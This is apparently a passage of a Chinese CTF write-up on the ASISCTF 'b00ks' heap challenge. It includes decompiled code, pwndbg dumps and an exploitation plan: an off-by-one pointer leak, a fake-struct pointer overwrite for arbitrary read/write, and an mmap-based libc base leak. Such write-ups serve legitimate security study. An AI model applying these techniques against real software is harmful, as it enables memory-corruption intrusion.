punctuation">.</span>/b00ks Welcome to ASISCTF book libraryEnter author name<span class="token operator">:</span> AAAAA<span class="token number">1</span><span class="token punctuation">.</span> Create a book<span class="token number">2</span><span class="token punctuation">.</span> Delete a book<span class="token number">3</span><span class="token punctuation">.</span> Edit a book<span class="token number">4</span><span class="token punctuation">.</span> Print book detail<span class="token number">5</span><span class="token punctuation">.</span> Change current author name<span class="token number">6</span><span class="token punctuation">.</span> Exit<span class="token operator">></span> 经典菜单</code></pre><h3 id="IDA–关键函数"><a href="#IDA–关键函数" class="headerlink" title="IDA–关键函数"></a>IDA–关键函数</h3><pre><code>signed __int64 input_author(){  printf(&quot;Enter author name: &quot;);  if ( !(unsigned int)read_buf_n(data_Author, 32) )// off by one  将结尾的\n换位\x00    return 0LL;  printf(&quot;fail to read author_name&quot;, 32LL);  return 1LL;}</code></pre><p>在输入作家名称时，存在Off By One read_buf_n可以输入n+1个字符，Author存放在.data段：</p><pre class=" language-java"><code class="language-java"><span class="token number">0000000000202010</span> data_struk_ptr  dq offset unk_202060    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> check_struk_ptr<span class="token operator">:</span>loc_B38↑o   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>chunk结构体指针<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000202010</span>                                         <span class="token punctuation">;</span> delet<span class="token operator">:</span>loc_C1B↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000202018</span> data_Author     dq offset unk_202040    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> input_author<span class="token operator">+</span><span class="token number">15</span>↑o     <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>字符串指针<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000202018</span>                                         <span class="token punctuation">;</span> show<span class="token operator">+</span>CA↑o<span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000202018</span> _data           ends</code></pre><p><strong>一定注意，这里两个都是指针 其指向的位置分别为unk_202060    unk_202040    ，即真正的内容 Author地址在 chunk结构体指针上面 相差0x20：</strong></p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx $<span class="token function">rebase</span><span class="token punctuation">(</span><span class="token number">0x00202010</span><span class="token punctuation">)</span><span class="token number">0x555555756010</span><span class="token operator">:</span>    <span class="token number">0x0000555555756060</span>    <span class="token number">0x0000555555756040</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>依次为两个指针，可以看到Author指向的位置在 struck_ptr指向的位置之上<span class="token number">0x555555756020</span><span class="token operator">:</span>    <span class="token number">0x0000000100000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756040</span><span class="token operator">:</span>    <span class="token number">0x4141414141414141</span>    <span class="token number">0x0000000000000000</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>存放name字符串<span class="token number">0x555555756050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756060</span><span class="token operator">:</span>    <span class="token number">0x0000555555757480</span>    <span class="token number">0x0000000000000000</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span>存放struck指针<span class="token number">0x555555756070</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756080</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>这是在第一次执行完add函数后偏移为<span class="token number">0x00202010</span>的data段数据 </code></pre><p><strong>面对PIE $rebase(offset) 这个指令简直就是神器</strong></p><p>他们两个的位置刚好相差0x20那么就可以用单字节溢出来覆盖截断符\x00，使得Author name字符串与指针相邻，这样在输出Author时就会把指针带出来。</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx $<span class="token function">rebase</span><span class="token punctuation">(</span><span class="token number">0x00202010</span><span class="token punctuation">)</span><span class="token number">0x555555756010</span><span class="token operator">:</span>    <span class="token number">0x0000555555756060</span>    <span class="token number">0x0000555555756040</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>指针<span class="token number">0x555555756020</span><span class="token operator">:</span>    <span class="token number">0x0000000100000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756040</span><span class="token operator">:</span>    <span class="token number">0x6161616261616161</span>    <span class="token number">0x6161616461616163</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Author<span class="token number">0x555555756050</span><span class="token operator">:</span>    <span class="token number">0x6161616661616165</span>    <span class="token number">0x6161616861616167</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>Author<span class="token number">0x555555756060</span><span class="token operator">:</span>    <span class="token number">0x0000555555757480</span>    <span class="token number">0x0000000000000000</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>struck指针输入<span class="token number">32</span>个字符：aaaabaaacaaadaaaeaaafaaagaaahaaa\n</code></pre><p>这个过程是：我们read后从0x555555756040开始将会村放32个字符+\x00这样覆盖了所有的\x00防止截断,最后的\x00会覆盖到0x555555756060的第一个字节，然后执行完add函数后strck_ptr会放到这里。这样两个数据就完美拼接了。接下来的泄露指针就很简单了。</p><p>接下来是重头戏：add函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-1Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr2_chunk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr2_name_chunk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr2_descrip_chunk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter book name size: "</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//size无限制</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter book name (Max 32 chars): "</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr2_name_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr2_name_chunk <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read_buf_n</span><span class="token punctuation">(</span>ptr2_name_chunk<span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// not off by one</span>      <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to read name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter book description size: "</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          ptr2_descrip_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr2_descrip_chunk <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter book description: "</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read_buf_n</span><span class="token punctuation">(</span>ptr2_descrip_chunk<span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// not off by one</span>            <span class="token punctuation">{</span>              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Unable to read description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              v2 <span class="token operator">=</span> <span class="token function">check_struk_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// check 20 times</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>              <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Library is full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              <span class="token keyword">else</span>              <span class="token punctuation">{</span>                ptr2_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr2_chunk <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr2_chunk <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>data_struk_ptr <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> ptr2_chunk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//data_struk_ptr这里存放chunk结构体指针</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr2_chunk <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr2_descrip_chunk<span class="token punctuation">;</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr2_chunk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr2_name_chunk<span class="token punctuation">;</span>                  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr2_chunk <span class="token operator">=</span> <span class="token operator">++</span>unk_202024<span class="token punctuation">;</span>                  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>下面的否则就没必要分析了，还有几个free函数，也不用管因为 上面就有一个<span class="token keyword">return</span> <span class="token number">0</span>                                </code></pre><p>具体就不分析了，下面是数据结构图：<br><img src="https://s1.ax1x.com/2020/09/27/0k2P76.png" alt=""><br>上图重点在于struck_chunk构造，name_chunk,descrip_chunk次之。<br>下面的就是一个book的整体构成：这里假设name_chunk 和 descrip_chunk都为malloc(0x20)<br><img src="https://s1.ax1x.com/2020/09/27/0k2C0x.png" alt=""><br>其他函数：</p><ul><li>delet 根据ID  free name_chunk descrip_chunk struck_chunk 并最后将struck指针变量置零，很绝</li><li>edit 也是根据ID 修改descrip_chunk里面的内容 写入的字节数由原struck_chunk中的size控制</li><li>show 函数 根据struck 寻找并打印ID，Name，Description ，根据data段指针打印Author</li><li>change_author 相当于重新调用input_author函数，即存在单字节溢出</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>首先我们使用一次单字节溢出很容易可以得到book1_struck的指针，这样就知道了每个堆块的地址</li><li>每次change_author我们都可以覆盖struck指针低地址这样就可以控制其指向我们可控的地址</li><li>在可控区构造一个fake_struck_chunk:<pre class=" language-java"><code class="language-java">fake_struck_chunk <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>ID<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>vunl_addr1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>vunl_addr2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span></code></pre></li><li>如果能把struck指针指向这里就可以实现任意地址读写（edit，print）<ul><li>我们可以对之前申请好的struck指针进行覆盖‘A’*32+\n最后的\n被改为\x00，这样也就是说会将指针的最后以为改为00，所以该指针偏移范围就是0x00~0xff </li><li>因为我们对name chunk 和descrip chunk申请的空间无节制所以可以控制他们的大小来使得修改后的指针落在可改写区：description中<br>这是第一次add后的堆数据<pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x555555757000</span>      <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              None<span class="token number">0x555555757410</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              None<span class="token number">0x555555757440</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              None<span class="token number">0x555555757470</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              Nonepwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x555555757410</span><span class="token number">0x555555757410</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> name_chunk <span class="token number">0x30</span><span class="token number">0x555555757420</span><span class="token operator">:</span>    <span class="token number">0x4242424242424242</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757430</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757440</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> descrip_chunk  <span class="token number">0x30</span><span class="token number">0x555555757450</span><span class="token operator">:</span>    <span class="token number">0x4343434343434343</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757460</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757470</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>     <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>struck  <span class="token number">0x30</span><span class="token number">0x555555757480</span><span class="token operator">:</span>    <span class="token number">0x0000000000000001</span>    <span class="token number">0x0000555555757420</span>      <span class="token number">0x555555757490</span><span class="token operator">:</span>    <span class="token number">0x0000555555757450</span>    <span class="token number">0x0000000000000020</span><span class="token number">0x5555557574a0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020b61</span><span class="token number">0x5555557574b0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574d0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574e0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574f0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757500</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>8gx $<span class="token function">rebase</span><span class="token punctuation">(</span><span class="token number">0x00202010</span><span class="token punctuation">)</span><span class="token number">0x555555756010</span><span class="token operator">:</span>    <span class="token number">0x0000555555756060</span>    <span class="token number">0x0000555555756040</span><span class="token number">0x555555756020</span><span class="token operator">:</span>    <span class="token number">0x0000000100000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756040</span><span class="token operator">:</span>    <span class="token number">0x4141414141414141</span>    <span class="token number">0x0000000000000000</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>authorpwndbg<span class="token operator">></span> <span class="token number">0x555555756050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756060</span><span class="token operator">:</span>    <span class="token number">0x0000555555757480</span>    <span class="token number">0x0000000000000000</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ptr2_struck_chunk_data<span class="token number">0x555555756070</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756080</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>pwndbg<span class="token operator">></span> </code></pre>如果这时把0x0000555555757480    覆盖为0x0000555555757400 那么 我们就无法控制，所以要调节那么chunk大小，把name chunk调为0xe：<pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x555555757000</span>      <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              None<span class="token number">0x555555757410</span>      <span class="token number">0x0</span>                 <span class="token number">0xe0</span>                 Used                None              None<span class="token number">0x5555557574f0</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              None<span class="token number">0x555555757520</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              Nonepwndbg<span class="token operator">></span> x<span class="token operator">/</span>64gx <span class="token number">0x555555757410</span><span class="token number">0x555555757410</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x00000000000000e1</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>name chunk<span class="token number">0x555555757420</span><span class="token operator">:</span>    <span class="token number">0x4242424242424242</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757430</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757440</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757450</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757460</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757470</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757480</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757490</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574a0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574b0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574d0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574e0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574f0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>descrip chunk<span class="token number">0x555555757500</span><span class="token operator">:</span>    <span class="token number">0x4343434343434343</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757510</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757520</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>struck chunk<span class="token number">0x555555757530</span><span class="token operator">:</span>    <span class="token number">0x0000000000000001</span>    <span class="token number">0x0000555555757420</span><span class="token number">0x555555757540</span><span class="token operator">:</span>    <span class="token number">0x0000555555757500</span>    <span class="token number">0x0000000000000020</span><span class="token number">0x555555757550</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020ab1</span><span class="token number">0x555555757560</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>8gx $<span class="token function">rebase</span><span class="token punctuation">(</span><span class="token number">0x00202010</span><span class="token punctuation">)</span><span class="token number">0x555555756010</span><span class="token operator">:</span>    <span class="token number">0x0000555555756060</span>    <span class="token number">0x0000555555756040</span>   <span class="token number">0x555555756020</span><span class="token operator">:</span>    <span class="token number">0x0000000100000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756040</span><span class="token operator">:</span>    <span class="token number">0x4141414141414141</span>    <span class="token number">0x0000000000000000</span>pwndbg<span class="token operator">></span> <span class="token number">0x555555756050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756060</span><span class="token operator">:</span>    <span class="token number">0x0000555555757530</span>    <span class="token number">0x0000000000000000</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>ptr2struck chunk<span class="token number">0x555555756070</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555756080</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre>这样0x0000555555757530    ======&gt;0x0000555555757500,就刚好落在descrip chunk的data段 ，在这里构造fake struck </li></ul></li></ul><p>我们可以构造一个struck book2 这里malloc两个很大的chunk 大于 top chunk这样就会调用mmap来映射一片合适的空间，而这个mmap的地址与libc的加载地址的偏移是固定的，所以泄露第二个book的name 或者descrip地址就可以根据偏移算出 libc加载地址。<br>输入两个book：</p><pre class=" language-java"><code class="language-java">book1：size：<span class="token number">0xd0</span>   name<span class="token operator">:</span>AAAAAAAA size<span class="token operator">:</span><span class="token number">32</span>  descrip<span class="token operator">:</span>BBBBBBBBbook1：size：<span class="token number">0x21000</span>   name<span class="token operator">:</span>AAAAAAAA size<span class="token operator">:</span><span class="token number">0x21000</span>  descrip<span class="token operator">:</span>BBBBBBBB  </code></pre><pre class=" language-java"><code class="language-java">addr                prev                size                 status              fd                bk                <span class="token number">0x555555757000</span>      <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              None<span class="token number">0x555555757410</span>      <span class="token number">0x0</span>                 <span class="token number">0xe0</span>                 Used                None              None<span class="token number">0x5555557574f0</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              None<span class="token number">0x555555757520</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              None<span class="token number">0x555555757550</span>      <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              Nonepwndbg<span class="token operator">></span> x<span class="token operator">/</span>64gx <span class="token number">0x555555757410</span><span class="token number">0x555555757410</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x00000000000000e1</span><span class="token number">0x555555757420</span><span class="token operator">:</span>    <span class="token number">0x4141414141414141</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757430</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757440</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757450</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757460</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757470</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757480</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757490</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574a0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574b0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574d0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574e0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x5555557574f0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span><span class="token number">0x555555757500</span><span class="token operator">:</span>    <span class="token number">0x4242424242424242</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757510</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x555555757520</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span><span class="token number">0x555555757530</span><span class="token operator">:</span>    <span class="token number">0x0000000000000001</span>    <span class="token number">0x0000555555757420</span><span class="token number">0x555555757540</span><span class="token operator">:</span>    <span class="token number">0x0000555555757500</span>    <span class="token number">0x0000000000000020</span><span class="token number">0x555555757550</span><span class="token 